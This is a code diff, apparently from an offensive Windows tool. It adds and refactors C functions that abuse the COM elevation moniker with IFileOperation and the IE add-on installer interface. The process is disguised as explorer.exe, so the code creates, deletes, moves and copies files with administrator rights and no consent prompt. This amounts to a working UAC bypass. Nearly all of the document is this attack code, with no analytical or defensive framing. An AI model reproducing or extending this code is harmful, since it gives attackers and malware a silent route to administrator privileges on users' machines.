@@ -221,11 +221,12 @@ BOOL MasqueradedDeleteDirectoryFileCOM
 	IFileOperation* pFileOperation = NULL;
 	IShellItem* pShellItem = NULL;
 	HRESULT hResult = E_FAIL;
-	HRESULT hResultInit = E_FAIL;
 	BIND_OPTS3 BindOpts;
 	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";
+	IID IID_IFileOperation = { 0x947AAB5F, 0xA5C, 0x4C13, { 0xB4, 0xD6, 0x4B, 0xF7, 0x83, 0x6F, 0xC9, 0xF8} };
+	IID IID_IShellItem = { 0x43826D1E, 0xE718, 0x42EE, { 0xBC, 0x55, 0xA1, 0xE2, 0x61, 0xC3, 0x7B, 0xFE } };
 
-	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
 	BindOpts.cbStruct = sizeof(BindOpts);
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
@@ -269,10 +270,79 @@ CLEANUP:
 		pShellItem->lpVtbl->Release(pShellItem);
 	}
 
-	if (hResultInit == S_OK) {
-		CoUninitialize();
+	CoUninitialize();
+	return Result;
+}
+
+BOOL MasqueradedCreateDirectoryFileCOM
+(
+	_In_ LPWSTR lpFilePath
+)
+{
+	BOOL  Result = FALSE;
+	IFileOperation* pFileOperation = NULL;
+	IShellItem* pShellItem = NULL;
+	HRESULT hResult = E_FAIL;
+	BIND_OPTS3 BindOpts;
+	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";
+	IID IID_IFileOperation = { 0x947AAB5F, 0xA5C, 0x4C13, { 0xB4, 0xD6, 0x4B, 0xF7, 0x83, 0x6F, 0xC9, 0xF8} };
+	IID IID_IShellItem = { 0x43826D1E, 0xE718, 0x42EE, { 0xBC, 0x55, 0xA1, 0xE2, 0x61, 0xC3, 0x7B, 0xFE } };
+	LPWSTR lpParentFolder = NULL;
+	LPWSTR lpName = NULL;
+
+	lpParentFolder = DuplicateStrW(lpFilePath, 0);
+	lpName = PathFindFileNameW(lpParentFolder);
+	lpName[-1] = L'\0';
+	if (!IsFolderExist(lpParentFolder)) {
+		goto CLEANUP;
 	}
 
+	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
+	BindOpts.cbStruct = sizeof(BindOpts);
+	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
+	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CoGetObject", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pFileOperation->SetOperationFlags", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = SHCreateItemFromParsingName(lpParentFolder, NULL, &IID_IShellItem, &pShellItem);
+	if (FAILED(hResult)) {
+		LOG_ERROR("SHCreateItemFromParsingName", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->NewItem(pFileOperation, pShellItem, FILE_ATTRIBUTE_DIRECTORY, lpName, NULL, NULL);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pFileOperation->NewItem", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pFileOperation->PerformOperations", hResult);
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	FREE(lpParentFolder);
+	if (pFileOperation != NULL) {
+		pFileOperation->lpVtbl->Release(pFileOperation);
+	}
+
+	if (pShellItem != NULL) {
+		pShellItem->lpVtbl->Release(pShellItem);
+	}
+
+	CoUninitialize();
 	return Result;
 }
 
@@ -288,11 +358,12 @@ BOOL MasqueradedMoveCopyDirectoryFileCOM
 	IShellItem* pSrcItem = NULL;
 	IShellItem* pDestItem = NULL;
 	HRESULT hResult = E_FAIL;
-	HRESULT hResultInit = E_FAIL;
 	BIND_OPTS3 BindOpts;
 	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";
+	IID IID_IFileOperation = { 0x947AAB5F, 0xA5C, 0x4C13, { 0xB4, 0xD6, 0x4B, 0xF7, 0x83, 0x6F, 0xC9, 0xF8} };
+	IID IID_IShellItem = { 0x43826D1E, 0xE718, 0x42EE, { 0xBC, 0x55, 0xA1, 0xE2, 0x61, 0xC3, 0x7B, 0xFE } };
 
-	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
 	BindOpts.cbStruct = sizeof(BindOpts);
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
@@ -356,10 +427,7 @@ CLEANUP:
 		pDestItem->lpVtbl->Release(pDestItem);
 	}
 
-	if (hResultInit == S_OK) {
-		CoUninitialize();
-	}
-
+	CoUninitialize();
 	return Result;
 }
 
@@ -438,7 +506,6 @@ BOOL IeAddOnInstallMethod
 )
 {
 	HRESULT hResult = E_FAIL;
-	HRESULT hResultInit = E_FAIL;
 	BIND_OPTS3 BindOpts;
 	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}";
 	GUID IID_IEAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, { 0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77 } };
@@ -462,6 +529,7 @@ BOOL IeAddOnInstallMethod
 	WCHAR wszExplorerPath[MAX_PATH];
 	LPWSTR OldPath[5];
 	WCHAR wszNullStr[0x10];
+	IID IID_IUnknown = { 0, 0, 0, { 0xC0, 0, 0, 0, 0, 0, 0, 0x46 } };
 
 	SecureZeroMemory(wszNullStr, sizeof(wszNullStr));
 	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
@@ -469,12 +537,12 @@ BOOL IeAddOnInstallMethod
 	lstrcatW(wszExplorerPath, L"\\explorer.exe");
 	RtlSecureZeroMemory(OldPath, sizeof(OldPath));
 	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
-	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
+	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	/*hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
 		LOG_ERROR("CoInitializeSecurity", hResult);
 		goto CLEANUP;
-	}
+	}*/
 
 	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
 	BindOpts.cbStruct = sizeof(BindOpts);
@@ -571,10 +639,7 @@ CLEANUP:
 		SysFreeString(CacheItemFilePath);
 	}
 
-	if (hResultInit == S_OK) {
-		CoUninitialize();
-	}
-
+	CoUninitialize();
 	return Result;
 }
 
